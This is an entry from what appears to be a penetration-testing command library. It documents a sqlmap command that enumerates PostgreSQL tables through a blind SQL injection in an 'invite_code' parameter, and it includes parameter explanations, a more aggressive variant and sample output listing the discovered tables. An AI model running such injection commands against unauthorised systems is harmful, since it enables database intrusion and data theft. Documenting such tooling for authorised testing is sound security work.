---
id: cmd-uuid-1
data: >-
  sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql --tables
  --force-ssl
tags:
  - sqli
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.190Z'
verified: false
validated: true
submitted: true
---
# sqlmap-enumerate-postgresql-tables

## Command

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql --tables --force-ssl
```

## Description

This command automates SQL injection testing to enumerate all tables in a PostgreSQL database via a vulnerable POST request file, useful after manual confirmation of blind SQLi in web parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-r sqli-mozilla.req` | Load HTTP request details from file | Yes |
| `--level=3` | Increase testing thoroughness and verbosity | No |
| `-p invite_code` | Specify injectable parameter | Yes |
| `--dbms=postgresql` | Set database type to PostgreSQL | Yes |
| `--tables` | Enumerate database tables | Yes |
| `--force-ssl` | Enforce SSL connections | No |

## Examples

### Basic Usage

```bash
sqlmap -r request.req -p param --dbms=postgresql --tables
```

### Advanced Usage

```bash
sqlmap -r sqli-mozilla.req --level=5 -p invite_code --dbms=postgresql --tables --batch --force-ssl
```

## Expected Output

Database name: public
Available tables [9]:
[*] allowlist
[*] disallowed_handles
[*] invitation_tokens
[*] knex_migrations
[*] knex_migrations_lock
[*] oidc_payloads
[*] regexp_disallowed_handles
[*] sub_to_account
[*] waitlist

## Related

- [[Related Procedure: Automated-Database-Enumeration-with-sqlmap]]
